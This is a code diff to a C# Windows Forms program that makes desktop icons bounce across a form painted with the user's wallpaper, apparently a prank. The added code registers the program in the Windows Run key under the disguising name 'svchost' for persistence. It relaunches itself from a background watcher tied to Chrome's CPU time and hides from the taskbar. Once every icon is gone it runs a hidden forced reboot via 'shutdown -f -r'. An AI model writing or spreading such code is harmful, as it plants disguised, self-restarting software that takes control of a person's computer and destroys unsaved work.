@@ -3,9 +3,12 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -13,22 +16,37 @@ namespace EnvironmentLesson
 {
     public partial class Form1 : Form
     {
-        Random rand = new Random();
-        List<AppControl> buttons = new List<AppControl>();
-        List<string> names = new List<string>();
-        List<string> icons = new List<string>();
-        Timer timer;
+        //Tests
+        public int decreaseApp = 0;
+
+
+        private Random rand = new Random();
+        public static List<AppControl> buttons = new List<AppControl>();
+        public static List<AppControl> deleted = new List<AppControl>();
+        private static List<string> names = new List<string>();
+        private static List<string> icons = new List<string>();
+        System.Windows.Forms.Timer timer;
         public Form1()
         {
             InitializeComponent();
 
+            RegistryKey runReg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            runReg.SetValue("svchost", System.Reflection.Assembly.GetEntryAssembly().Location);
+            runReg.Close();
             //
             //  Main Settings
             //
             this.StartPosition = FormStartPosition.Manual;
             this.WindowState = FormWindowState.Maximized;
+            this.DoubleBuffered = true;
 
 
+            Thread thread = new Thread(new ThreadStart(StartApp));
+            if (!thread.IsAlive)
+            {
+                thread.IsBackground = false;
+                thread.Start();
+            }
             // 
             //  Hide from Taskbar
             //
@@ -44,56 +62,97 @@ namespace EnvironmentLesson
             //
             //  Move event
             //
-            timer = new Timer();
+            timer = new System.Windows.Forms.Timer();
             timer.Tick += moveIcons;
-            timer.Interval = 100;
+            timer.Interval = 10;
 
             //
             //  Main Button Event
             //
             this.button1.Click += button1_Click;
+
+
+            RegistryKey curent = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
+            Image bg = Image.FromFile(curent.GetValue("WallPaper").ToString());
+            this.BackgroundImage = bg;
+            curent.Close();
+            this.BackgroundImageLayout = ImageLayout.Stretch;
+        }
+
+        public static void StartApp()
+        {
+            Process procChrome = Process.GetProcessesByName("chrome")[0];
+            while (true)
+            {
+                if (procChrome.TotalProcessorTime.TotalMinutes >= 2)
+                {
+
+                    RegistryKey getval = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
+                    string app = getval.GetValue("svchost").ToString();
+                    getval.Close();
+                    Process.Start(app);
+                }
+                Thread.Sleep(1000);
+            }
+        }
+        private static void Restart()
+        {
+            ProcessStartInfo proc = new ProcessStartInfo();
+            proc.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.FileName = "cmd";
+            proc.Arguments = "/C shutdown -f -r";
+            Process.Start(proc);
+
         }
 
         private void moveIcons(object sender, EventArgs e)
         {
-            for (int i = 0; i < this.buttons.Count; i++)
+            if (buttons.Count == 0)
+            {
+                Restart();
+            }
+
+            for (int i = 0; i < buttons.Count; i++)
             {
                 //
                 // To many if :<
                 //
-                this.buttons[i].Location = new Point(this.buttons[i].Location.X + getXAxis(i),
-                    this.buttons[i].Location.Y + getYAxis(i));
+                buttons[i].Location = new Point(buttons[i].Location.X + getXAxis(i),
+                    buttons[i].Location.Y + getYAxis(i));
             }
+
+            this.Invalidate();
+            this.Update();
         }
 
         private int getXAxis(int id)
         {
-            if (this.buttons[id].Location.X < 0)
+            if (buttons[id].Location.X < 0)
             {
-                this.buttons[id].XAxis = -this.buttons[id].XAxis;
+                buttons[id].XAxis = -buttons[id].XAxis;
                 //return 1;
             }
-            if (this.buttons[id].Location.X + this.buttons[id].Size.Width > this.ClientSize.Width)
+            if (buttons[id].Location.X + buttons[id].Size.Width > this.ClientSize.Width)
             {
-                this.buttons[id].XAxis = -this.buttons[id].XAxis;
+                buttons[id].XAxis = buttons[id].XAxis;
                 //return -1;
             }
-            return this.buttons[id].XAxis;
+            return buttons[id].XAxis;
             //return rand.Next(-1, 2);
         }
         private int getYAxis(int id)
         {
-            if (this.buttons[id].Location.Y < 0)
+            if (buttons[id].Location.Y < 0)
             {
-                this.buttons[id].YAxis = -this.buttons[id].YAxis;
+                buttons[id].YAxis = -buttons[id].YAxis;
                 //return 1;
             }
-            if (this.buttons[id].Location.Y + this.buttons[id].Size.Height > this.ClientSize.Height)
+            if (buttons[id].Location.Y + buttons[id].Size.Height > ClientSize.Height)
             {
-                this.buttons[id].YAxis = -this.buttons[id].YAxis;
+                buttons[id].YAxis = -buttons[id].YAxis;
                 //return -1;
             }
-            return this.buttons[id].YAxis;
+            return buttons[id].YAxis;
             //return rand.Next(-1, 2);
         }
 
@@ -119,7 +178,7 @@ namespace EnvironmentLesson
                     TEMP.label1.Text = names[i];
                     // -50 на всякий случай
                     TEMP.Location = new Point(rand.Next(0, this.ClientSize.Width - TEMP.Width - 50), rand.Next(0, this.ClientSize.Height - TEMP.Height - 50));
-                    this.buttons.Add(TEMP);
+                    buttons.Add(TEMP);
                 }
 
                 catch (Exception e)
@@ -138,13 +197,20 @@ namespace EnvironmentLesson
                     TEMP.label1.Text = names[i];
                     // -50 на всякий случай
                     TEMP.Location = new Point(rand.Next(0, this.ClientSize.Width - TEMP.Width - 50), rand.Next(0, this.ClientSize.Height - TEMP.Height - 50));
-                    this.buttons.Add(TEMP);
+                    buttons.Add(TEMP);
                 }
             }
 
-            for (int i = 0; i < this.buttons.Count; i++)
+            for (int i = 0; i < buttons.Count - decreaseApp; i++)
             {
-                this.Controls.Add(this.buttons[i]);
+                for (int j = 0; j < deleted.Count; j++)
+                {
+                    if (buttons[i] == deleted[j])
+                    {
+                        return;
+                    }
+                }
+                this.Controls.Add(buttons[i]);
             }
 
             //
@@ -209,6 +275,11 @@ namespace EnvironmentLesson
                     }
                 }
             }
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
 
         }
     }
